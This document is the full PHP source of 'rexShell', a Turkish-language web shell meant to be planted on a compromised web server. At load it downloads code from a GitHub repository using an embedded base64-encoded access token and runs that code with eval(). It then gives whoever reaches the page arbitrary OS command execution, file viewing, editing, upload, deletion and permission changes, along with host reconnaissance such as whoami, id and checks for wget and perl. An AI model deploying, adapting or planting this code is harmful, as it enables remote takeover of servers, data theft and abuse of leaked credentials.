<?php
set_time_limit(0);
error_reporting(E_ALL);
session_start();
function get_content_from_github($url) {
    //$proxy="proxy.adress:80";
    //$auth="user:pass";    
	$token = 'Nzc3YTQ2YTRkMzJhNDExMDk3M2Q1YTY0M2RlMWE2MjY5MWE5MjllMg==';
    	$curl_token_auth = 'Authorization: token ' . base64_decode($token);
	$ch = curl_init();
	curl_setopt($ch,CURLOPT_URL,$url);
    //curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
    //curl_setopt($ch, CURLOPT_PROXY, $proxy);    
    //curl_setopt($ch, CURLOPT_PROXYUSERPWD, $auth); 
	curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); 
	curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('User-Agent: Awesome-Octocat-App',$curl_token_auth));
	$content = curl_exec($ch);
	curl_close($ch);
	return $content;
}

function get_repo_json($file) {
		$json = array();
		$json[]= json_decode(get_content_from_github('https://api.github.com/repos/XianThi/rexShell/contents/'.$file),true);
    	return $json;
}
$config=get_repo_json('config/config.rex');
$config=base64_decode($config["0"]["content"]);
eval($config);
$init=get_repo_json('functions/init.rex');
$init=base64_decode($init["0"]["content"]);
eval($init);
$actions=get_repo_json('functions/actions.rex');
$actions=base64_decode($actions["0"]["content"]);

call_user_func('check_login',$password);
if(isset($_GET["logout"])){
call_user_func('logout');
}

if(isset($_GET['action'])){
eval($actions);
}


function prex($text){
    return trim(str_replace("<br>","",$text));
    }
function magicboom($text){
    if (!get_magic_quotes_gpc()){
        return $text;
        } 
        return stripslashes($text);
        }
function exe($command,$pwd){
    if(function_exists('system')){
        @chdir($pwd);
        @ob_start();
        @system($command);
        $buff = @ob_get_contents();
        $buff = @ob_get_contents();
        @ob_end_clean();
    return $buff;
    }elseif(function_exists('exec')){
     @exec($command,$results);
        $buff = "";
        foreach($results as $result){
        $buff .= $result;
        } 
        return $buff;
        }elseif(function_exists('passthru')){
            @ob_start();
            @passthru($command);
            $buff = @ob_get_contents();
            @ob_end_clean();
            return $buff;
            }elseif(function_exists('shell_exec')){
                $buff = @shell_exec($command);
                return $buff;
                }
}
function get_perms($file) {
    if($mode=@fileperms($file)){
        $perms='';
        $perms .= ($mode & 00400) ? 'r' : '-';
        $perms .= ($mode & 00200) ? 'w' : '-';
        $perms .= ($mode & 00100) ? 'x' : '-';
        $perms .= ($mode & 00040) ? 'r' : '-';
        $perms .= ($mode & 00020) ? 'w' : '-';
        $perms .= ($mode & 00010) ? 'x' : '-';
        $perms .= ($mode & 00004) ? 'r' : '-';
        $perms .= ($mode & 00002) ? 'w' : '-';
        $perms .= ($mode & 00001) ? 'x' : '-';
return $perms;
}else return "??????????";
}

function get_perm_value($file) {
$mode=@fileperms($file);
return decoct($mode & 0777);
}

function clearspace($text){
    return str_replace(" ","_",$text);
    }

function boyut($file){
    if($size = @filesize($file)){
        if($size <= 1024) return $size;
        else{if($size <= 1024*1024) {
            $size = @round($size / 1024,2);
            return "$size kb";
            } else {
                $size = @round($size / 1024 / 1024,2);
                return "$size mb";}}}
else return "???";
} 



function get_safemode(){
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on"){
$safe_mode=TRUE;
}else{
$safe_mode=FALSE;
}
return $safe_mode;
}

function get_os(){
$system = @php_uname();
if(strtolower(substr($system,0,3)) == "win"){
$win=TRUE;
}else{
$win=FALSE;
}
return $win;
}
function get_posix(){
if(function_exists("posix_getpwuid") && function_exists("posix_getgrgid")){
    $posix = TRUE;
    }else{
        $posix = FALSE;
        }
}

function testmysql() {if (function_exists('mysql_connect')) {return "AÇIK";}else {return "KAPALI";}}
function testcurl() {if (function_exists('curl_version')) {return "AÇIK";}else {return "KAPALI";}}
function testwget() {if (exe('wget --help')) {return "AÇIK";}else {return "KAPALI";}}
function testperl() {if (exe('perl -h')) {return "AÇIK";}else {return "KAPALI";}}

function get_info(){
$os=get_os();
if (!$os){
if(prex(exe("whoami"))){
$user=prex(exe("whoami"));
}
if(prex(exe("id"))){
$id=prex(exe("id"));
}
}else{
$user = @get_current_user();
$id = $user;
}
$mysql=testmysql();
$curl=testcurl();
$wget=testwget();
$perl=testperl();
$software = getenv("SERVER_SOFTWARE");
$serverip = @gethostbyname($_SERVER["HTTP_HOST"]);
$myip = $_SERVER['REMOTE_ADDR'];
if(get_safemode()){
$safemode="AÇIK";
}else{
$safemode="KAPALI";
}
if($os){
$osx="Windows";
}else{
$osx="Linux";
}
$info=array('user'=>$user, 'id'=>$id,'os'=>$osx,'safemode'=>$safemode,'software'=>$software,'serverip'=>$serverip,'myip'=>$myip,'mysql'=>$mysql,'curl'=>$curl,'wget'=>$wget,'perl'=>$perl);
return $info;
}

function command_prompt($pwd,$prompt){
$buff="";
if($prompt){
$buff.='<div class="form-group">
  <label for="cikti">Çıktı:</label>
  <textarea class="form-control" rows="5" id="cikti">'.exe($prompt,$pwd).'</textarea>
</div>';
}
$buff .= " <form action='?path=".$pwd."&amp;action=yes' method='post' style='margin:8px 0 0 0;'><table class='table table-condensed'><tr><td>Komut : </td><td><input onMouseOver='this.focus();' id='cmd' class='inputz' type='text' name='cmd' style='width:400px;' value='$prompt' /><input class='btn btn-danger' type='submit' value='execute !' name='submitcmd' style='width:80px;' /></td></tr></form><form action='?' method='get' style='margin:8px 0 0 0;'><input type='hidden' value='yes' name='action' /><tr><td>view file/folder</td><center><td><input onMouseOver='this.focus();' id='goto' class='inputz' type='text' name='path' style='width:400px;' value='".$pwd."' /><input class='btn btn-primary' type='submit' value='view !' name='submitcmd' style='width:80px;' /></td></center></tr></form></table>";

return $buff;
}

function chmod_box($pwd,$file){
$perms=get_perms($file);
$perm_value=get_perm_value($file);
$buff='
<form method=GET>
<div class="form-group">
  <label for="chmod">'.$file.' için chmod ayarları (Şuan : '.$perms.'):</label>
  <input type="hidden" name="action" value="yes" />
  <input type="hidden" value="ok" name="update_chmod" />
  <input type="hidden" value="'.$file.'" name="chmod" />
  <input class="form-control" value="'.$perm_value.'" id="chmod" name="newchmod"/>
  <input type="submit" value="Değiştir" />
</div>
</form>';

return $buff;
}

function view_file($pwd,$file){
$perms=get_perms($file);
if (function_exists('highlight_file')){
$content=highlight_file ($file,true);
}else{
$handle = fopen($file,'r+');
if ($handle) {
    while (($buffer = fgets($handle, 4096)) !== false) {
        $content .= htmlentities($buffer);
    }
    if (!feof($handle)) {
        $content= "Error: unexpected fgets() fail\n";
    }
    fclose($handle);
}
}
$buff='
<div class="container">
<div class="row">
<div class="col-md-4">
<span><a class="btn btn-default" href="?path='.$pwd.'">Geri</a></span></div>
<div class="col-md-4"><span> <b>Dosya Görüntüle : '.$file.'</b>:</span></div>
<div class="col-md-4"><a class="btn btn-default" href="?path='.$pwd.'&edit='.$file.'">Düzenle</a> <a class="btn btn-default" href="?path='.$pwd.'&delete='.$file.'">Sil</a> <a class="btn btn-default" href="?path='.$pwd.'&download='.$file.'">İndir</a></div>
</div>
<div class="row">
<blockquote>
  <p>'.$content.'</p>
</blockquote>
</div></div>';

return $buff;
}

function edit_file($pwd,$file){
$perms=get_perms($file);

$handle = fopen($file,'r+');
if ($handle) {
    while (($buffer = fgets($handle, 4096)) !== false) {
        $content .= htmlentities($buffer);
    }
    if (!feof($handle)) {
        $content= "Error: unexpected fgets() fail\n";
    }
    fclose($handle);
}
$buff='
<div class="container">
<div class="row">
<div class="col-md-4">
<span><a class="btn btn-default" href="?path='.$pwd.'">Geri</a></span></div>
<div class="col-md-4"><span> <b>Dosya Görüntüle : '.$file.'</b> ('.$perms.'):</span></div>
<div class="col-md-4"><a class="btn btn-default" href="?path='.$pwd.'&view='.$file.'">Görüntüle</a> <a class="btn btn-default" href="?path='.$pwd.'&delete='.$file.'">Sil</a> <a class="btn btn-default" href="?path='.$pwd.'&download='.$file.'">İndir</a></div>
</div>
<div class="row">
<form method=POST action="'. $_SERVER['REQUEST_URI'].'&action=yes">
  <input type="hidden" value="ok" name="update_file" />
  <input type="hidden" value="'.$file.'" name="edit" />
<textarea class="form-control" name="content">'.$content.'</textarea>
<input type="submit" class="form-control" value="Kaydet" />
</form>
</div></div>';

return $buff;
}

function new_file($pwd,$file){
$perms=get_perms($file);
$namelist=explode('/',$file);
$filename=$namelist[(count($namelist)-1)];
foreach($namelist as $nlist){
if ($nlist<>$filename){
$path .= $nlist.'/';
}
}
$buff='<form method=POST action="'. $_SERVER['REQUEST_URI'].'&action=yes">
<div class="container">
<div class="row">
<div class="col-md-4">
<span><a class="btn btn-default" href="?path='.$pwd.'">Geri</a></span></div>
<div class="col-md-4"><span> <b>Dosya Oluştur : '.$path.'</b></span><input type="text" value="'.$filename.'" name="newfile" /></div>
</div>
<div class="row">

  <input type="hidden" value="ok" name="new_file" />
<textarea class="form-control" name="content"></textarea>
<input type="submit" class="form-control" value="Kaydet" />
</div></div></form>';

return $buff;
}

function upload_file(){
echo '<form enctype="multipart/form-data" method=POST action="'. $_SERVER['REQUEST_URI'].'&action=yes">
    <label>Dosya seçin : </label><input class="form-control" name="uploaded" type="file" />
    <input type="hidden" value="ok" name="uploadfile" />
    <label><input type="checkbox" name="zip" />Zip olarak yükle (bypass)</label>
    <input class="form-control" type="submit" value="Yükle" />
</form>';
}

function rename_box($pwd,$file){
if (isset($_GET["newname"])){
$fname=$_GET["newname"];
}else{
$fname=$file;
}
$buff='
<form method=GET>
<div class="form-group">
  <label for="name">'.$fname.' dosyasını yeniden adlandır:</label>
  <input type="hidden" name="action" value="yes" />
  <input type="hidden" value="ok" name="update_name" />
  <input type="hidden" value="'.$fname.'" name="rename" />
  <input class="form-control" value="'.$fname.'" id="name" name="newname"/>
  <input type="submit" value="Değiştir" />
</div>
</form>';

return $buff;
}
function download_file($file,$gzip=FALSE){
if (!$gzip){
$filez = @file_get_contents($file);
    header("Content-type: application/octet-stream");
    header("Content-length: ".strlen($filez));
    header("Content-disposition: attachment;filename=".basename($file).";");
    echo $filez;
    exit;
}else{
$filez = gzencode(@file_get_contents($file));
        header("Content-Type:application/x-gzip\n");
        header("Content-length: ".strlen($filez));
        header("Content-disposition: attachment;filename=".basename($file).".gz;");
        echo $filez;
        exit;
        } 
}

function download_image($path,$file){
@ob_clean();
    $d = magicboom($path);
    $f = $file;
    $inf = @getimagesize($d.$f);
    $ext = explode($f,".");
    $ext = $ext[count($ext)-1];
    @header("Content-type: ".$inf["mime"]);
    @header("Cache-control: public");
    @header("Expires: ".date("r",mktime(0,0,0,1,1,2030)));
    @header("Cache-control: max-age=".(60*60*24*7));
    @readfile($d.$f);
    exit;
}

function get_dir($pwd){
$fname = array();$dname = array(); 
if($dh = opendir($pwd)){
    while($file = readdir($dh)){
if(is_dir($pwd.$file)){
    $dname[] = $file;
    } 
elseif(
is_file($pwd.$file)){
    $fname[] = $file;
    }
    }
closedir($dh);
}
sort($fname);
sort($dname);
$path = @explode(DIRECTORY_SEPARATOR,$pwd);
$tree = @sizeof($path);
$parent = "";
$info=get_info();
$user=$info["user"];
$buff = ' <div class="well-sm" id="tools">
    <a href="?path='.$pwd.'&upload=rex" class="btn btn-default" id="upload-button"><i class="icon-upload icon-white"></i> Dosya Yükle </a>
    <a href="?path='.$pwd.'&newfile='.$pwd.'ex.php" class="btn btn-default" id="new-file-button"><i class="icon-file"></i> Dosya Oluştur </a>
    <a href="?path='.$pwd.'&newfolder='.$pwd.'rex" class="btn btn-default" id="new-folder-button"><i class="icon-folder-close"></i> Klasör Oluştur </a>
    <a href="?path='.$pwd.'" class="btn btn-default" id="refresh-button"><i class="icon-refresh"></i> Yenile </a>
    </div>';
$buff .= "<table class='table table-bordered'><thead> <tr><th>Dosya Adı</th><th>Boyut</th><th>Sahip:Grup</th><th>İzinler</th><th>Son Düzenleme</th><th>Eylemler</th></tr> </thead>";
if($tree > 2){
for($i=0;$i<$tree-2;$i++){
    $parent .= $path[$i].DIRECTORY_SEPARATOR;
}
}else{$parent = $pwd;
}
$buff .= '<tbody>';
foreach($dname as $folder){
if($folder == ".") {
if(!get_os() && get_posix()){
$name=@posix_getpwuid(@fileowner($folder));
$group=@posix_getgrgid(@filegroup($folder));
$owner = $name['name']."<span class='gaya'> : </span>".$group['name'];
}else{
    $owner = $user;
}
$buff .= "<tr><td><a href=\"?path=".$pwd."\">$folder</a></td><td>-</td>
<td>".$owner."</td>
<td><center>".get_perms($pwd)."</center></td>
<td>".date("d-M-Y",@filemtime($pwd))."</td><td><span id=\"titik1\">
<a href=\"?path=$pwd&amp;newfile=".$pwd."ex.php\">Yeni Dosya</a> | <a href=\"?path=$pwd&amp;newfolder=".$pwd."rex\">Yeni Klasör</a>
</span></td></tr> ";}elseif($folder == ".."){
if(!get_os() && get_posix()){
$name=@posix_getpwuid(@fileowner($folder));
$group=@posix_getgrgid(@filegroup($folder));
$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];   
    }else { $owner = $user; } 
    $buff .= "<tr><td>
<a href=\"?path=".$parent."\"><i class='glyphicon glyphicon-folder-open'></i></a></td><td>-</td>
<td>".$owner."</td>
<td><center>".get_perms($parent)."</center></td> <td>".date("d-M-Y",@filemtime($parent))."</td>
<td><span id=\"titik2\"><a href=\"?path=$pwd&amp;newfile=".$parent."ex.php\">Yeni Dosya</a> | <a href=\"?path=$pwd&amp;newfolder=".$parent."rex\">Yeni Klasör</a></span> 
</td></tr>";
    }else{
if(!get_os() && get_posix()){
 $name=@posix_getpwuid(@fileowner($folder)); 
$group=@posix_getgrgid(@filegroup($folder)); 
$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];   
    }else { $owner = $user; }
$buff .= "<tr><td><a id=\"".clearspace($folder)."_link\" href=\"?path=".$pwd.$folder.DIRECTORY_SEPARATOR."\"><i class='glyphicon glyphicon-folder-close'></i>  $folder</a> 
</td><td>DIR</td><td>".$owner."</td><td><center>
<a href=\"?path=$pwd&chmod=$pwd$folder\">".get_perms($pwd.$folder)."</a>
</center></td><td>".date("d-M-Y",@filemtime($folder))."</td><td><a href=\"?path=$pwd&amp;rename=$pwd$folder\">Yeniden Adlandır</a>| <a href=\"?path=$pwd&amp;fdelete=".$pwd.$folder."\">Sil</a>
</td>
</tr>";}}
foreach($fname as $file){
$full = $pwd.$file;
if(!get_os() && get_posix()){
    $name=@posix_getpwuid(@fileowner($file)); 
    $group=@posix_getgrgid(@filegroup($file)); 
    $owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
    }else { $owner = $user; }
    $buff .= "<tr><td><a id=\"".clearspace($file)."_link\" href=\"?path=$pwd&amp;view=$full\"><i class='glyphicon glyphicon-file'></i> $file</a> 
</td><td>".boyut($full)."</td><td>".$owner."</td><td><center>
<a href=\"?path=$pwd&chmod=$full\">".get_perms($full)."</a>
</center></td>
<td>".date("d-M-Y",@filemtime($full))."</td> 
<td><a href=\"?path=$pwd&amp;edit=$full\">Düzenle</a> | <a href=\"?path=$pwd&amp;rename=$full\">Yeniden Adlandır</a>| <a href=\"?path=$pwd&amp;delete=$full\">Sil</a> | <a href=\"?path=$pwd&amp;download=$full\">İndir</a>&nbsp;(<a href=\"?path=$pwd&amp;downloadgz=$full\">gzip</a>)
</td></tr>";} 
$buff .= "</table>"; 
return $buff;
}
    
    
 


function change_name($oldname,$newname){
@rename($oldname,$newname);
$file = $newname;
return $file;
}

function change_chmod($filename,$value){
if (strlen($value)==3){
    $value = 0 . "" . $value;}
$old_perm=get_perm_value($filename);
@chmod($filename,octdec($value));
$file = $filename;
if (($old_perm<>$value) and ($old_perm==get_perm_value($file))){
return false;
}else{
return TRUE;
}
}

function update_file($filename,$content){
if (is_writable($filename)){
$file_handle = fopen($filename, 'w'); 
fwrite($file_handle, $content);
fclose($file_handle);
return TRUE;
}else{
return FALSE;
}
}

function create_file($filename,$content){
if (!file_exists($filename)){
$file_handle = fopen($filename, 'w'); 
fwrite($file_handle, $content);
fclose($file_handle);
return TRUE;
}else{
return FALSE;
}
}

function upload($zip=FALSE){
$file = $_FILES['uploaded']['name'];
if ($zip){
if(@copy($_FILES['uploaded']['tmp_name'], $file)) { 
    $zip = new ZipArchive;
if ($zip->open($file) === TRUE) {
    $zip->extractTo('./');
    $zip->close();
    return TRUE;
    }else{
        return FALSE;
    }
    }
}else{
$fname=$_GET["path"].basename($file);
if (move_uploaded_file($_FILES['uploaded']['tmp_name'], $fname))
{
    return TRUE;
    }else{
        return FALSE;
    }
}
}

function delete_file($filename){
if(is_writeable($filename)){
return unlink($filename);
}else{
return FALSE;
}
}

function change_dir($path){
if(@is_dir($path)){
@chdir($path);
}
}




?>

<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>rexShell</title>
<!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous" />

<!-- Optional theme -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous" />
<link href="https://fonts.googleapis.com/css?family=Ubuntu" rel="stylesheet" />
<style>
body{
background:#000;
color:#0a6d0a;
font-family: 'Ubuntu', sans-serif;
}
tr a {
    color: #0a6d0a;
}
th{
    color:red;
}
textarea.form-control {
  height: 100%;
  max-height:350px;
  background : #000;
  color:#fff;
}
</style>
<body>
 <!-- Navigation -->
    <nav class="navbar navbar-inverse" role="navigation">
        <div class="container">
            <!-- Brand and toggle get grouped for better mobile display -->
            <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand" href="<?=homeurl();?>">
                rexShell
                </a>
            </div>
            <!-- Collect the nav links, forms, and other content for toggling -->
            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
                <ul class="nav navbar-nav">
                    <li>
                        <a href="#">Shell</a>
                    </li>
                    <li>
                        <a href="#">Mysql Connect</a>
                    </li>
                    <li>
                        <a href="#">Back Connect</a>
                    </li>
                    
                </ul>
                <ul class="nav navbar-nav pull-right"><li><a href="?logout=ok">Çıkış Yap</a></li></ul>
            </div>
            <!-- /.navbar-collapse -->
        </div>
        <!-- /.container -->
    </nav>
    
<div id="main" class="container">
<div class="row">
<div class="alert alert-<?=$alert_style;?>" style="<?php if(!$alert_display){echo "display:none;";}?>"><?=$alert_message;?></div>
<?php 
if (isset($_GET['path'])){
$pwd=$_GET["path"];}else{
$pwd=homedir();}
if (is_file($pwd)){
$viewfile=$pwd;
$pwd=pathinfo($pwd);
$pwd=$pwd["dirname"];
$listdir=FALSE;
}
if (substr($pwd,-1)!="/"){
$pwd=$pwd."/";
}
if(isset($_POST["cmd"])){
$prompt=$_POST["cmd"];
}else{
$prompt='';
}
echo command_prompt($pwd,$prompt);

if(isset($_GET["chmod"])){
echo chmod_box($pwd,$_GET["chmod"]);
}
if(isset($_GET["rename"])){
echo rename_box($pwd,$_GET["rename"]);
}

if(isset($_GET["view"])){
echo view_file($pwd,$_GET["view"]);
$listdir=FALSE;
}

if(isset($_GET["edit"])){
echo edit_file($pwd,$_GET["edit"]);
$listdir=FALSE;
}
if(isset($_GET["newfile"])){
echo new_file($pwd,$_GET["newfile"]);
$listdir=FALSE;
}
if(isset($_GET["upload"])){
echo upload_file();
}

if (isset($viewfile)){
echo view_file($pwd,$viewfile);
}
if ($listdir){
echo get_dir($pwd);
}

?>
</div>
</div>
 <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
<!-- Latest compiled and minified JavaScript -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
</head>

</body>
</html>
